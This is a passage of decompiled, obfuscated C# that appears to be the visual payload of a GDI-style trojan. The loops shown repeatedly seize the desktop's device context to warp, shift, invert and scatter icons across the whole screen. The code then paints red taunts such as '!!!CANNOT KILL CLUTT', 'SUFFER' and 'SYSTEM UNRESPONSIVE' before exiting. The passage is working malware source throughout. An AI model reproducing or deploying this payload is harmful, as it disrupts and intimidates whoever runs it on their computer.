			intPtr2 = GClass0.GetWindowDC(intPtr);
			if (this.random_0.Next(2) == 1)
			{
				GClass0.StretchBlt(intPtr2, this.random_0.Next(-15, 10), 0, width + 10, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCCOPY);
			}
			else
			{
				GClass0.StretchBlt(intPtr2, 0, this.random_0.Next(-15, 10), width, height + 10, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCCOPY);
			}
			Thread.Sleep(25);
			if (this.random_0.Next(50) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		this.bool_8 = true;
		for (int n = 0; n < 250; n++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			GClass0.StretchBlt(intPtr2, 0, 0, num, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCCOPY);
			GClass0.StretchBlt(intPtr2, width, 0, -num, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCCOPY);
			Thread.Sleep(50);
			if (this.random_0.Next(7) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		this.bool_9 = true;
		for (int num3 = 0; num3 < 200; num3++)
		{
			if (!this.bool_0)
			{
				this.bool_0 = true;
			}
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			IntPtr intPtr5 = GClass0.CreateSolidBrush(this.random_0.Next(255));
			GClass0.SelectObject(intPtr2, intPtr5);
			GClass0.PatBlt(intPtr2, 0, 0, this.random_0.Next(width + width / 4), height, GClass0.GEnum0.PATINVERT);
			GClass0.BitBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCAND);
			GClass0.BitBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCAND);
			GClass0.PatBlt(intPtr2, 0, 0, width, this.random_0.Next(height + height / 3), GClass0.GEnum0.PATINVERT);
			Thread.Sleep(30);
			if (this.random_0.Next(10) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
			GClass0.DeleteObject(intPtr5);
		}
		this.method_3();
		this.bool_10 = true;
		for (int num4 = 0; num4 < 350; num4++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
			GClass0.SelectObject(intPtr2, intPtr3);
			GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
			GClass0.DeleteObject(intPtr3);
			if (this.random_0.Next(20) == 3)
			{
				GClass0.BitBlt(intPtr2, this.random_0.Next(-10, 10), this.random_0.Next(-10, 10), width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCINVERT);
			}
			if (this.random_0.Next(50) == 1)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
			Thread.Sleep(25);
		}
		this.method_3();
		this.bool_11 = true;
		for (int num5 = 0; num5 < 1; num5++)
		{
			for (int num6 = 0; num6 < 60; num6++)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, -30, -30, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				if (this.random_0.Next(5) == 1)
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
				else
				{
					intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
					GClass0.SelectObject(intPtr2, intPtr3);
					GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
					GClass0.StretchBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.StretchBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.DeleteObject(intPtr3);
				}
				Thread.Sleep(25);
			}
			for (int num7 = 0; num7 < 60; num7++)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, 30, 30, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				if (this.random_0.Next(5) == 1)
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
				else
				{
					intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
					GClass0.SelectObject(intPtr2, intPtr3);
					GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
					GClass0.StretchBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.StretchBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.DeleteObject(intPtr3);
				}
				Thread.Sleep(25);
			}
			for (int num8 = 0; num8 < 60; num8++)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, -30, 0, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				if (this.random_0.Next(5) == 1)
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
				else
				{
					intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
					GClass0.SelectObject(intPtr2, intPtr3);
					GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
					GClass0.StretchBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.StretchBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.DeleteObject(intPtr3);
				}
				Thread.Sleep(25);
			}
			for (int num9 = 0; num9 < 60; num9++)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, 30, 0, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				if (this.random_0.Next(5) != 1)
				{
					intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
					GClass0.SelectObject(intPtr2, intPtr3);
					GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
					GClass0.StretchBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.StretchBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.DeleteObject(intPtr3);
				}
				else
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
				Thread.Sleep(25);
			}
			for (int num10 = 0; num10 < 60; num10++)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, 0, -30, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				if (this.random_0.Next(5) != 1)
				{
					intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
					GClass0.SelectObject(intPtr2, intPtr3);
					GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
					GClass0.StretchBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.StretchBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.DeleteObject(intPtr3);
				}
				else
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
				Thread.Sleep(25);
			}
			for (int num11 = 0; num11 < 60; num11++)
			{
				intPtr = GClass0.GetDesktopWindow();
				intPtr2 = GClass0.GetWindowDC(intPtr);
				GClass0.BitBlt(intPtr2, 0, 30, width, height, intPtr2, 0, 0, GClass0.GEnum0.SRCCOPY);
				if (this.random_0.Next(5) != 1)
				{
					intPtr3 = GClass0.CreateSolidBrush(this.random_0.Next(100000000));
					GClass0.SelectObject(intPtr2, intPtr3);
					GClass0.PatBlt(intPtr2, 0, 0, width, height, GClass0.GEnum0.PATINVERT);
					GClass0.StretchBlt(intPtr2, 1, 1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.StretchBlt(intPtr2, -1, -1, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
					GClass0.DeleteObject(intPtr3);
				}
				else
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
				Thread.Sleep(25);
			}
		}
		this.method_3();
		this.bool_12 = true;
		for (int num12 = 0; num12 < 150; num12++)
		{
			if (!this.bool_1)
			{
				this.bool_1 = true;
			}
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			array[0].int_0 = this.random_0.Next(width + width / 2);
			array[0].int_1 = 0;
			array[1].int_0 = width;
			array[1].int_1 = height;
			array[2].int_0 = 0;
			array[2].int_1 = 0;
			GClass0.PlgBlt(intPtr2, array, intPtr2, 0, 0, width, height, intPtr4, 0, 0);
			Thread.Sleep(25);
			if (this.random_0.Next(20) == 1)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		for (int num13 = 0; num13 < 150; num13++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			array[0].int_0 = 0;
			array[0].int_1 = this.random_0.Next(height + height / 2);
			array[1].int_0 = width;
			array[1].int_1 = height;
			array[2].int_0 = 0;
			array[2].int_1 = 0;
			GClass0.PlgBlt(intPtr2, array, intPtr2, 0, 0, width, height, intPtr4, 0, 0);
			Thread.Sleep(25);
			if (this.random_0.Next(20) == 1)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
		}
		this.method_3();
		this.bool_13 = true;
		int num14 = 0;
		while (num14 < 500)
		{
			if (this.bool_1)
			{
				this.bool_1 = false;
				this.bool_2 = true;
				GClass0.DeleteDC(intPtr2);
			}
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			IntPtr dc = GClass0.GetDC(IntPtr.Zero);
			if (this.random_0.Next(5) == 1)
			{
				using (Graphics graphics = Graphics.FromHdc(dc))
				{
					graphics.DrawIcon(icon2, this.random_0.Next(width), this.random_0.Next(height));
					goto IL_E40;
				}
				goto IL_DBD;
			}
			goto IL_DBD;
			IL_E21:
			GClass0.ReleaseDC(IntPtr.Zero, dc);
			Thread.Sleep(30);
			num14++;
			continue;
			IL_E10:
			GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			goto IL_E21;
			IL_DBD:
			if (this.random_0.Next(5) == 1)
			{
				using (Graphics graphics2 = Graphics.FromHdc(dc))
				{
					graphics2.DrawIcon(icon, this.random_0.Next(-300, width), this.random_0.Next(-300, height));
					goto IL_E40;
				}
				goto IL_E10;
			}
			IL_E40:
			if (this.random_0.Next(100) != 50)
			{
				goto IL_E21;
			}
			goto IL_E10;
		}
		this.method_3();
		this.bool_3 = true;
		for (int num15 = 0; num15 < 700; num15++)
		{
			if (!this.bool_4)
			{
				this.bool_2 = false;
				this.bool_3 = false;
				this.bool_4 = true;
			}
			IntPtr dc2 = GClass0.GetDC(IntPtr.Zero);
			using (Graphics graphics3 = Graphics.FromHdc(dc2))
			{
				string text = "!!!CANNOT KILL CLUTT";
				string text2 = "SUFFER";
				string text3 = "ERROR";
				string text4 = "MIDGET";
				string text5 = "SYSTEM UNRESPONSIVE";
				Font font = new Font("Impact", (float)this.random_0.Next(20, 50));
				SolidBrush solidBrush = new SolidBrush(Color.Red);
				int num16 = this.random_0.Next(width);
				int num17 = this.random_0.Next(height);
				StringFormat stringFormat = new StringFormat();
				stringFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft;
				if (this.random_0.Next(5) == 0)
				{
					graphics3.DrawString(text, font, solidBrush, (float)num16, (float)num17, stringFormat);
				}
				else if (this.random_0.Next(5) == 4)
				{
					graphics3.DrawString(text2, font, solidBrush, (float)num16, (float)num17, stringFormat);
				}
				else if (this.random_0.Next(5) == 3)
				{
					graphics3.DrawString(text3, font, solidBrush, (float)num16, (float)num17, stringFormat);
				}
				else if (this.random_0.Next(5) == 2)
				{
					graphics3.DrawString(text4, font, solidBrush, (float)num16, (float)num17, stringFormat);
				}
				else if (this.random_0.Next(5) == 1)
				{
					graphics3.DrawString(text5, font, solidBrush, (float)num16, (float)num17, stringFormat);
				}
				if (this.random_0.Next(100) == 3)
				{
					GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
				}
			}
			GClass0.ReleaseDC(IntPtr.Zero, dc2);
			Thread.Sleep(30);
		}
		this.method_3();
		this.bool_14 = true;
		for (int num18 = 0; num18 < 250; num18++)
		{
			if (this.bool_4)
			{
				this.bool_4 = false;
				this.method_3();
			}
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			intPtr4 = GClass0.GetDC(intPtr2);
			GClass0.GStruct0[] array2 = array;
			int num19 = 0;
			int num20 = this.int_5;
			this.int_5 = num20 + 1;
			array2[num19].int_0 = num20;
			array[0].int_1 = height;
			array[1].int_0 = 0;
			array[1].int_1 = 0;
			array[2].int_0 = width;
			array[2].int_1 = height;
			GClass0.PlgBlt(intPtr2, array, intPtr2, 0, 0, width, height, intPtr4, 0, 0);
			if (this.random_0.Next(10) == 5)
			{
				intPtr3 = GClass0.CreateSolidBrush(255);
				GClass0.SelectObject(intPtr2, intPtr3);
				GClass0.StretchBlt(intPtr2, 0, 0, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.hmm);
				GClass0.StretchBlt(intPtr2, this.random_0.Next(-2, 2), this.random_0.Next(-2, 2), width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.SRCAND);
				GClass0.DeleteObject(intPtr3);
			}
			Thread.Sleep(30);
		}
		for (int num21 = 0; num21 < 200; num21++)
		{
			intPtr = GClass0.GetDesktopWindow();
			intPtr2 = GClass0.GetWindowDC(intPtr);
			IntPtr intPtr6 = GClass0.CreateSolidBrush(this.random_0.Next(255));
			GClass0.SelectObject(intPtr2, intPtr6);
			GClass0.PatBlt(intPtr2, 0, 0, this.random_0.Next(width + width / 4), height, GClass0.GEnum0.PATINVERT);
			GClass0.StretchBlt(intPtr2, 0, 0, width, height, intPtr2, 0, 0, width, height, GClass0.GEnum0.hmm);
			GClass0.PatBlt(intPtr2, 0, 0, width, this.random_0.Next(height + height / 3), GClass0.GEnum0.PATINVERT);
			Thread.Sleep(5);
			if (this.random_0.Next(100) == 3)
			{
				GClass0.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
			}
			GClass0.DeleteObject(intPtr6);
		}
		Environment.Exit(-1);
	}

	// Token: 0x0400002C RID: 44
	private int int_0 = 1;

	// Token: 0x0400002D RID: 45
	private int int_1 = 29;

	// Token: 0x0400002E RID: 46
	public const int int_2 = 0;

	// Token: 0x0400002F RID: 47
	public const int int_3 = 1;

	// Token: 0x04000030 RID: 48
	public const int int_4 = 2;

	// Token: 0x04000031 RID: 49
	private SoundPlayer soundPlayer_0;

	// Token: 0x04000032 RID: 50
	private SoundPlayer soundPlayer_1;

	// Token: 0x04000033 RID: 51
	private SoundPlayer soundPlayer_2;

	// Token: 0x04000034 RID: 52
	private SoundPlayer soundPlayer_3;

	// Token: 0x04000035 RID: 53
	private SoundPlayer soundPlayer_4;

	// Token: 0x04000036 RID: 54
	private SoundPlayer soundPlayer_5;

	// Token: 0x04000037 RID: 55
	private SoundPlayer soundPlayer_6;

	// Token: 0x04000038 RID: 56
	private SoundPlayer soundPlayer_7;

	// Token: 0x04000039 RID: 57
	private SoundPlayer soundPlayer_8;

	// Token: 0x0400003A RID: 58
	private SoundPlayer soundPlayer_9;

	// Token: 0x0400003B RID: 59
	private const uint uint_0 = 2147483648U;

	// Token: 0x0400003C RID: 60
	private const uint uint_1 = 1073741824U;

	// Token: 0x0400003D RID: 61
	private const uint uint_2 = 536870912U;

	// Token: 0x0400003E RID: 62
	private const uint uint_3 = 268435456U;

	// Token: 0x0400003F RID: 63
	private const uint uint_4 = 1U;

	// Token: 0x04000040 RID: 64
	private const uint uint_5 = 2U;

	// Token: 0x04000041 RID: 65
	private const uint uint_6 = 3U;

	// Token: 0x04000042 RID: 66
	private const uint uint_7 = 67108864U;

	// Token: 0x04000043 RID: 67
	private const uint uint_8 = 512U;

	// Token: 0x04000044 RID: 68
	private Random random_0;

	// Token: 0x04000045 RID: 69
	private int int_5 = 0;

	// Token: 0x04000046 RID: 70
	private bool bool_0 = false;

	// Token: 0x04000047 RID: 71
	private bool bool_1 = false;

	// Token: 0x04000048 RID: 72
	private bool bool_2 = false;

	// Token: 0x04000049 RID: 73
	private bool bool_3 = false;

	// Token: 0x0400004A RID: 74
	private bool bool_4 = false;

	// Token: 0x0400004B RID: 75
	private bool bool_5 = false;

	// Token: 0x0400004C RID: 76
	private bool bool_6 = false;

	// Token: 0x0400004D RID: 77
	private bool bool_7 = false;

	// Token: 0x0400004E RID: 78
	private bool bool_8 = false;

	// Token: 0x0400004F RID: 79
	private bool bool_9 = false;

	// Token: 0x04000050 RID: 80
	private bool bool_10 = false;

	// Token: 0x04000051 RID: 81
	private bool bool_11 = false;

	// Token: 0x04000052 RID: 82
	private bool bool_12 = false;

	// Token: 0x04000053 RID: 83
	private bool bool_13 = false;

	// Token: 0x04000054 RID: 84
	private bool bool_14 = false;

	// Token: 0x04000055 RID: 85
	private string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	// Token: 0x0200000D RID: 13
	public enum GEnum0
	{
		// Token: 0x04000057 RID: 87
		SRCCOPY = 13369376,
		// Token: 0x04000058 RID: 88
		SRCPAINT = 15597702,
		// Token: 0x04000059 RID: 89
		SRCAND = 8913094,
		// Token: 0x0400005A RID: 90
		SRCINVERT = 6684742,
		// Token: 0x0400005B RID: 91
		SRCERASE = 4457256,
		// Token: 0x0400005C RID: 92
		NOTSRCCOPY = 3342344,
		// Token: 0x0400005D RID: 93
		NOTSRCERASE = 1114278,
		// Token: 0x0400005E RID: 94
		MERGECOPY = 12583114,
		// Token: 0x0400005F RID: 95
		MERGEPAINT = 12255782,
		// Token: 0x04000060 RID: 96
		PATCOPY = 15728673,
		// Token: 0x04000061 RID: 97
		PATPAINT = 16452105,
		// Token: 0x04000062 RID: 98
		PATINVERT = 5898313,
		// Token: 0x04000063 RID: 99
		DSTINVERT = 5570569,
		// Token: 0x04000064 RID: 100
		BLACKNESS = 66,
		// Token: 0x04000065 RID: 101
		WHITENESS = 16711778,
		// Token: 0x04000066 RID: 102
		hmm = 1051781
	}

	// Token: 0x0200000E RID: 14
	public struct GStruct0
	{
		// Token: 0x04000067 RID: 103
		public int int_0;

		// Token: 0x04000068 RID: 104
		public int int_1;
	}
}
